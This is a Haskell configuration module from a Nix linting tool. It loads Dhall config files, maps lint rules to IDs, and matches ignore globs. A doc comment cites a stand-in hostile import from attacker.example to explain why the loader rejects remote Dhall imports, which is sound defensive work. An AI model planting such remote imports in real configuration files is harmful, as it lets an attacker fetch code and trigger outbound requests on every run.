{-# LANGUAGE DeriveGeneric #-}
{-# LANGUAGE DerivingStrategies #-}
{-# LANGUAGE LambdaCase #-}
{-# LANGUAGE OverloadedStrings #-}

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--                                                   // nix // compile // config
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--
--   "Credit me with a certain talent for obtaining desired results."
--
--                                                                 — Count Zero
--
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--                                                     // config // dhall
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

module NixCompile.Config (
  Severity (..),
  RuleOverride (..),
  Config (..),
  loadConfig,
  defaultConfig,
  effectiveSeverity,
  effectiveLayout,
  configIgnores,
  isIgnored,
  isSuppressed,
  bashRuleId,
  nixRuleId,
  derivRuleId,
  packageRuleId,
  patternRuleId,
  typeCheckRuleId,
)
where

import Control.Exception (SomeException, try)
import Data.Foldable (toList)
import Data.Text (Text)
import Data.Text qualified as T
import Data.Text.IO qualified as TIO
import Dhall (FromDhall, InterpretOptions (..), defaultInterpretOptions, genericAutoWith)
import Dhall qualified
import Dhall.Core qualified as DhallCore
import Dhall.Parser qualified as DhallParser
import GHC.Generics (Generic)
import System.FilePath qualified as FP

import NixCompile.Lint.Forbidden qualified as Bash
import NixCompile.Nix.LayoutConvention (Convention, layoutFromName)
import NixCompile.Nix.Lint qualified as NixLint
import NixCompile.Nix.LintDerivation qualified as Deriv
import NixCompile.Nix.LintPackages qualified as LintPackages
import NixCompile.Nix.LintPatterns qualified as LintPatterns

-- ────────────────────────────────────────────────────────────────────────────
-- Types
-- ────────────────────────────────────────────────────────────────────────────

data Severity
  = SevOff
  | SevInfo
  | SevWarning
  | SevError
  deriving stock (Eq, Ord, Show, Generic)

instance FromDhall Severity where
  autoWith _norm =
    genericAutoWith
      (defaultInterpretOptions{constructorModifier = T.drop 3})

data RuleOverride = RuleOverride
  { overrideId :: !Text
  , overrideSeverity :: !Severity
  , overrideReason :: !(Maybe Text)
  }
  deriving stock (Eq, Show, Generic)

instance FromDhall RuleOverride where
  autoWith _norm =
    genericAutoWith
      ( defaultInterpretOptions
          { fieldModifier = \case
              "overrideId" -> "id"
              "overrideSeverity" -> "severity"
              "overrideReason" -> "reason"
              n -> n
          }
      )

data Config = Config
  { configProfile :: !Text
  , configLayout :: !Text
  , configExtraIgnores :: ![Text]
  , configOverrides :: ![RuleOverride]
  }
  deriving stock (Eq, Show, Generic)

instance FromDhall Config where
  autoWith _norm =
    genericAutoWith
      ( defaultInterpretOptions
          { fieldModifier = \case
              "configProfile" -> "profile"
              "configLayout" -> "layout"
              "configExtraIgnores" -> "extra-ignores"
              "configOverrides" -> "overrides"
              n -> n
          }
      )

-- ────────────────────────────────────────────────────────────────────────────
-- Defaults
-- ────────────────────────────────────────────────────────────────────────────

defaultConfig :: Config
defaultConfig =
  Config
    { configProfile = "standard"
    , configLayout = "straylight"
    , configExtraIgnores = []
    , configOverrides = []
    }

-- ────────────────────────────────────────────────────────────────────────────
-- Queries
-- ────────────────────────────────────────────────────────────────────────────

effectiveLayout :: Config -> Convention
effectiveLayout = layoutFromName . configLayout

-- ────────────────────────────────────────────────────────────────────────────
-- Loading
-- ────────────────────────────────────────────────────────────────────────────

{- | Load a Dhall config file with remote imports forbidden.
n.b. fixes C6 from review-2: a hostile `.nix-compile.dhall` containing
`https://attacker.example/x.dhall` would otherwise perform outbound HTTPS
requests on every `nix-compile check` invocation. We pre-parse the source,
walk the AST for any 'DhallImport.Remote' imports, and refuse the file if
any are present.
-}
loadConfig :: FilePath -> IO (Either Text Config)
loadConfig path = do
  srcResult <- try (TIO.readFile path)
  case srcResult of
    Left (e :: SomeException) -> pure (Left (T.pack (show e)))
    Right src -> case DhallParser.exprFromText path src of
      Left e -> pure (Left ("dhall parse error: " <> T.pack (show e)))
      Right parsed -> case findRemoteImport parsed of
        Just url ->
          pure $
            Left $
              "refusing to load "
                <> T.pack path
                <> ": remote dhall import disabled (saw "
                <> url
                <> "). nix-compile config must be self-contained."
        Nothing -> do
          -- The pre-parse check guarantees no Remote imports survive to Dhall.inputFile.
          -- We still wrap in try so any unexpected exception (eval errors, etc.) is structured.
          result <- try (Dhall.inputFile Dhall.auto path)
          case result of
            Left (e :: SomeException) -> pure (Left (T.pack (show e)))
            Right config -> pure (Right config)

-- | Walk a parsed Dhall expression and return the first remote URL we encounter, if any.
findRemoteImport :: DhallCore.Expr DhallParser.Src DhallCore.Import -> Maybe Text
findRemoteImport expr = case foldr step Nothing (toList expr) of
  Just t -> Just t
  Nothing -> scanEmbed expr
 where
  step ::
    DhallCore.Import ->
    Maybe Text ->
    Maybe Text
  step imp acc = case acc of
    Just _ -> acc
    Nothing -> case DhallCore.importType (DhallCore.importHashed imp) of
      DhallCore.Remote url -> Just (T.pack (show url))
      _ -> Nothing

  scanEmbed e = case e of
    DhallCore.Embed imp -> case DhallCore.importType (DhallCore.importHashed imp) of
      DhallCore.Remote url -> Just (T.pack (show url))
      _ -> Nothing
    _ -> Nothing

-- ────────────────────────────────────────────────────────────────────────────
-- Queries
-- ────────────────────────────────────────────────────────────────────────────

effectiveSeverity :: Config -> Text -> Maybe Severity
effectiveSeverity config ruleId =
  case filter ((== ruleId) . overrideId) (configOverrides config) of
    override : _ -> Just (overrideSeverity override)
    [] -> Nothing

configIgnores :: Config -> [Text]
configIgnores = configExtraIgnores

isIgnored :: Config -> FilePath -> Bool
isIgnored config filePath = any (`matchGlob` normalisedPath) (configExtraIgnores config)
 where
  normalisedPath = FP.normalise filePath

isSuppressed :: Config -> Text -> Bool
isSuppressed config ruleId = effectiveSeverity config ruleId == Just SevOff

bashRuleId :: Bash.ViolationType -> Text
bashRuleId = \case
  Bash.VHeredoc -> "no-heredoc-in-inline-bash"
  Bash.VHereString -> "no-heredoc-in-inline-bash"
  Bash.VEval -> "no-eval"
  Bash.VBacktick -> "no-backtick"

nixRuleId :: NixLint.ViolationType -> Text
nixRuleId = \case
  NixLint.VWith -> "with-lib"
  NixLint.VRec -> "rec-anywhere"
  NixLint.VSubstituteAll -> "no-substitute-all"
  NixLint.VRawMkDerivation -> "no-raw-mkderivation"
  NixLint.VRawRunCommand -> "no-raw-runcommand"
  NixLint.VRawWriteShellApplication -> "no-raw-writeshellapplication"
  NixLint.VWriteShellScript -> "prefer-write-shell-application"
  NixLint.VLongInlineString _ -> "long-inline-string"

derivRuleId :: Deriv.DerivViolationType -> Text
derivRuleId = Deriv.derivRuleId

packageRuleId :: LintPackages.PackageViolationCode -> Text
packageRuleId = \case
  LintPackages.P001 -> "default-nix-in-packages"

patternRuleId :: LintPatterns.PatternViolationType -> Text
patternRuleId = \case
  LintPatterns.VOrNullFallback -> "or-null-fallback"
  LintPatterns.VAttrTranslation -> "no-translate-attrs-outside-prelude"

typeCheckRuleId :: Text
typeCheckRuleId = "type-check-failure"

-- ────────────────────────────────────────────────────────────────────────────
-- Internal: glob matching
-- ────────────────────────────────────────────────────────────────────────────

data Token
  = GlobStar
  | Star
  | Lit !String
  deriving (Show)

tokenise :: String -> [Token]
tokenise = go
 where
  go [] = []
  go ('*' : '*' : rest) = GlobStar : go rest
  go ('*' : rest) = Star : go rest
  go ('/' : rest) = go rest
  go chars =
    let (literal, rest') = break (`elem` ("*/" :: String)) chars
     in if null literal
          then go rest'
          else Lit literal : go rest'

charMatch :: String -> String -> Bool
charMatch [] [] = True
charMatch ('*' : pat) [] = charMatch pat []
charMatch ('*' : pat) string@(_ : rest) = charMatch pat string || charMatch ('*' : pat) rest
charMatch (char : pat) (otherChar : rest) = char == otherChar && charMatch pat rest
charMatch _ _ = False

tokensToPattern :: [Token] -> String
tokensToPattern [] = []
tokensToPattern (GlobStar : rest) = '*' : '*' : tokensToPattern rest
tokensToPattern (Star : rest) = '*' : tokensToPattern rest
tokensToPattern (Lit literal : rest) = literal <> tokensToPattern rest

splitComponents :: String -> [[Token]]
splitComponents = map tokenise . splitOn '/'

splitOn :: Char -> String -> [String]
splitOn _ [] = [""]
splitOn delimiter string =
  let (before, after) = break (== delimiter) string
   in before : case after of
        "" -> []
        _ : rest -> splitOn delimiter rest

matchComponents :: [[Token]] -> [String] -> Bool
matchComponents [] [] = True
matchComponents [] _ = False
matchComponents (component : remainingComponents) segments
  | null component = matchComponents remainingComponents segments
  | [GlobStar] <- component = matchGlobStar remainingComponents segments
  | segment : remainingSegments <- segments =
      charMatch (tokensToPattern component) segment
        && matchComponents remainingComponents remainingSegments
  | otherwise = False
 where
  matchGlobStar remainingComponentPatterns [] =
    matchComponents remainingComponentPatterns []
  matchGlobStar remainingComponentPatterns globSegments@(_ : _) =
    matchComponents remainingComponentPatterns globSegments
      || matchComponents (component : remainingComponentPatterns) (drop 1 globSegments)

matchGlob :: Text -> FilePath -> Bool
matchGlob patternText filePath
  | '/' `elem` globPattern = matchComponents (splitComponents globPattern) segments
  | otherwise = any (charMatch globPattern) segments
 where
  globPattern = T.unpack patternText
  segments = FP.splitDirectories filePath
